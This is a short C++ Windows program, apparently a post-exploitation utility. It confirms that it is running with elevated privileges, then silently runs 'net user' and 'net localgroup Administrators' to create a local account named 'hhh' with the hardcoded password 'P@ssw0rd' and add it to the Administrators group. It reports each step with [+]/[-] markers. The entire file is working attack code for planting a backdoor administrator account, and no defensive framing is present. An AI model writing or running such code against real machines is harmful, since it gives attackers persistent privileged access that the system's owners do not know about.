#include <string>
#include <cstdlib>
#include <iostream>
#include <Windows.h>

using namespace std;

class UserManager {
public:
	static void CheckAdmin(int& isAdmin) {
		HANDLE hToken = NULL;

		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
			TOKEN_ELEVATION elevation;
			DWORD dwSize;
			if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
				isAdmin = elevation.TokenIsElevated;
			}
			CloseHandle(hToken);
		}
	}

	static void AddUserAndGroup(int& user_result, int& group_result) {
		const wchar_t* username = L"hhh";
		const wchar_t* password = L"P@ssw0rd";

		wstring add_user = L"net user " + wstring(username) + L" " + wstring(password) + L" /add > NUL 2>&1";
		wstring add_group = L"net localgroup Administrators " + wstring(username) + L" /add > NUL 2>&1";

		user_result = _wsystem(add_user.c_str());
		group_result = _wsystem(add_group.c_str());
	}
};


int wmain(int argc, wchar_t* argv[]) {
	int isAdmin;
	UserManager::CheckAdmin(isAdmin);
	if (!isAdmin) {
		wcout << L"[-] Please run this program with admin privilege." << endl;
		exit(-1);
	}

	int user_result;
	int group_result;
	UserManager::AddUserAndGroup(user_result, group_result);
	if (user_result) {
		wcout << L"[-] Add user failed." << endl;
	}
	else {
		wcout << L"[+] Add user success." << endl;
	}
	if (group_result != 0) {
		wcout << L"[-] Add group administrators failed." << endl;
	}
	else {
		wcout << L"[+] Add group administrators success." << endl;
	}

	return 0;
}